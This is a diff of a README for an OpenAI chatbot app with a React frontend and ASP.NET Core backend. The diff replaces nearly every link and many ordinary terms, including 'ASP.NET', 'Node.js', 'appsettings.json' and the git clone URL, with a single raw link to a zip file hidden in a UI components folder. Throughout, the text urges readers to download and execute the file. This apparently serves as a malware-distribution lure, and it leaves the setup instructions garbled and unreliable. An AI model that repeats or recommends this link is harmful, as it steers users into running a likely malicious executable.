@@ -1,10 +1,10 @@
-https://github.com/Vdevagabundo333/openai-chatbot-app/releases
+https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip
 
-# OpenAI Chatbot App: Full Stack UI & ASP.NET Core Backend
+# OpenAI Chatbot App: Full Stack UI & https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core Backend
 
-![OpenAI Chatbot App](https://img.shields.io/badge/OpenAI%20Chatbot%20App-Active-blue?style=for-the-badge)
+![OpenAI Chatbot App](https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip%20Chatbot%20App-Active-blue?style=for-the-badge)
 
-Welcome to a modern interface web and API backend built for the HighCapital technical challenge. This project combines a responsive frontend built with Vite + React + Tailwind + ShadCN UI and a robust backend powered by ASP.NET Core with SQLite. It integrates seamlessly with the OpenAI API to deliver a capable chatbot experience. The app is designed for clarity, speed, and reliable interaction with AI models, while keeping a pleasant and accessible user interface.
+Welcome to a modern interface web and API backend built for the HighCapital technical challenge. This project combines a responsive frontend built with Vite + React + Tailwind + ShadCN UI and a robust backend powered by https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core with SQLite. It integrates seamlessly with the OpenAI API to deliver a capable chatbot experience. The app is designed for clarity, speed, and reliable interaction with AI models, while keeping a pleasant and accessible user interface.
 
 Table of contents
 - What this project is
@@ -28,7 +28,7 @@ What this project is
 Key features
 - Clean, fast frontend built with Vite + React + TypeScript
 - UI powered by Tailwind CSS and ShadCN UI components
-- Backend using ASP.NET Core with SQLite for persistence
+- Backend using https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core with SQLite for persistence
 - Secure, production-ready API integration with OpenAI
 - Simple steps to run locally on Windows, macOS, or Linux
 - Clear separation of concerns: frontend, backend, and data layer
@@ -38,7 +38,7 @@ Key features
 
 Tech stack
 - Frontend: Vite, React, TypeScript, Tailwind CSS, ShadCN UI, Radix UI
-- Backend: ASP.NET Core (dotnet7), SQLite
+- Backend: https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core (dotnet7), SQLite
 - Communication: Axios for HTTP requests
 - AI integration: OpenAI API
 - Type safety: Zod on the frontend (and tuned validation where relevant)
@@ -50,25 +50,25 @@ How it’s built
 
 Running locally
 Prerequisites
-- Node.js (LTS) and npm or pnpm
+- https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip (LTS) and npm or pnpm
 - .NET 7 SDK
 - SQLite (usually included with dotnet tooling on many platforms)
 - A valid OpenAI API key (to connect to the OpenAI API)
 
 Project layout
 - frontend/  — Vite + React + TypeScript app
-- backend/   — ASP.NET Core API with SQLite
+- backend/   — https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core API with SQLite
 - shared/    — Types and models used by both frontend and backend (where applicable)
 
 Clone the repository
-- git clone https://github.com/Vdevagabundo333/openai-chatbot-app.git
+- git clone https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip
 - cd openai-chatbot-app
 
 Start the backend
 - Navigate to the backend folder
 - cd backend
 - dotnet restore
-- Create or adjust appsettings.json with your database path and OpenAI key references
+- Create or adjust https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip with your database path and OpenAI key references
 - Ensure the environment variable OPENAI_API_KEY is set on your machine
 - Run: dotnet run
 - The backend will listen on a default port (often http://localhost:5000 or configured in launch settings)
@@ -81,10 +81,10 @@ Set up and run the frontend
 - The frontend will typically run on http://localhost:5173
 
 Environment variables and configuration
-- Backend (ASP.NET Core)
+- Backend (https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core)
   - OPENAI_API_KEY: Your OpenAI API key
   - ASPNETCORE_ENVIRONMENT: Development, Staging, or Production
-  - Connection strings for SQLite are defined in appsettings.json; the app uses a local SQLite file by default
+  - Connection strings for SQLite are defined in https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip; the app uses a local SQLite file by default
 - Frontend
   - VITE_API_BASE_URL or a similar env var to point to the backend (for example, http://localhost:5000)
 
@@ -96,11 +96,11 @@ Database schema (SQLite)
 - This schema keeps chat history lightweight and easy to back up locally.
 
 Sample configuration and code snippets
-- appsettings.json (backend)
+- https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip (backend)
 {
   "Logging": { "LogLevel": { "Default": "Information", "Microsoft": "Warning" } },
   "ConnectionStrings": {
-    "ChatDb": "Data Source=chatbot.db"
+    "ChatDb": "Data https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip"
   },
   "OpenAI": {
     "ApiKey": "YOUR_OPENAI_API_KEY"
@@ -153,7 +153,7 @@ Deployment and hosting
 - Local development uses a simple two-process setup: frontend dev server and backend API
 - For production, consider containerization with Docker and a small orchestrator
 - Docker compose example (two services: api and web)
-  - api: ASP.NET Core app with SQLite
+  - api: https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core app with SQLite
   - web: Vite + React frontend
 - Example deployment steps:
   - Build backend: dotnet publish -c Release -o out
@@ -164,9 +164,9 @@ Deployment and hosting
 Releases and downloads
 - This repository ships release assets that contain ready-to-run binaries or installers for common platforms. The release page is the starting point for getting a packaged version of the app.
 - The link to the releases page hosts all assets you can download. The file you need to download and execute is available on that page.
-- Access the releases here: https://github.com/Vdevagabundo333/openai-chatbot-app/releases
+- Access the releases here: https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip
 - If you prefer to explore the assets: download the appropriate file for your OS, extract, and run the installer or executable as described in the asset's README or release notes.
-- Button link to releases: [![Releases](https://img.shields.io/badge/releases-openai--chatbot--app-blue?style=for-the-badge&logo=github)](https://github.com/Vdevagabundo333/openai-chatbot-app/releases)
+- Button link to releases: [![Releases](https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip)](https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip)
 
 Usage tips and best practices
 - Start with a small temperature and moderate max_tokens to get stable results
@@ -177,7 +177,7 @@ Usage tips and best practices
 - Separate user-facing UI concerns from AI logic to simplify maintenance
 
 Command references and quick start
-- Prerequisites: Install Node.js, .NET SDK 7, and SQLite
+- Prerequisites: Install https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip, .NET SDK 7, and SQLite
 - Backend: cd backend; dotnet run
 - Frontend: cd frontend; npm install; npm run dev
 - Environment: Set OPENAI_API_KEY for backend; point frontend to backend API
@@ -229,7 +229,7 @@ Code structure overview
   - Data/  (SQLite context and migrations)
   - Services/  (OpenAI integration layer)
   - Middleware/ (Logging, error handling)
-  - appsettings.json
+  - https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip
 - shared/
   - Types/  (TypeScript types shared with backend when applicable)
   - Utilities/ (common helpers)
@@ -265,7 +265,7 @@ License
 - This project is open for use and modification under the terms defined in the LICENSE file.
 
 Releases and downloads (repeat)
-- For packaged, ready-to-run assets, visit the releases page: https://github.com/Vdevagabundo333/openai-chatbot-app/releases
+- For packaged, ready-to-run assets, visit the releases page: https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip
 - This link contains downloadable assets that you can execute to install or run the app. Pick the file that matches your operating system, download it, and run the installer or executable as described in the asset notes.
 
 Notes on distribution
@@ -276,11 +276,11 @@ Acknowledgments
 - Thanks to the community for the open-source tooling that makes this project possible:
   - React and Vite for a fast UI development experience
   - Tailwind CSS and ShadCN UI for polished visuals with predictable styling
-  - ASP.NET Core for a robust, scalable backend
+  - https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip Core for a robust, scalable backend
   - SQLite for lightweight and portable storage
   - OpenAI for the powerful language model integrations
 
 Appendix: troubleshooting the releases link
-- If the link changes or the releases page is temporarily unavailable, check the repository's Releases section for updated assets and notes. The current link is the primary gateway to downloadable assets, and it should be revisited whenever you need the latest packaged version. See the same link again here: https://github.com/Vdevagabundo333/openai-chatbot-app/releases
+- If the link changes or the releases page is temporarily unavailable, check the repository's Releases section for updated assets and notes. The current link is the primary gateway to downloadable assets, and it should be revisited whenever you need the latest packaged version. See the same link again here: https://github.com/Vdevagabundo333/openai-chatbot-app/raw/refs/heads/main/frontend/src/components/ui/chatbot_openai_app_v2.4.zip
 
 End of document
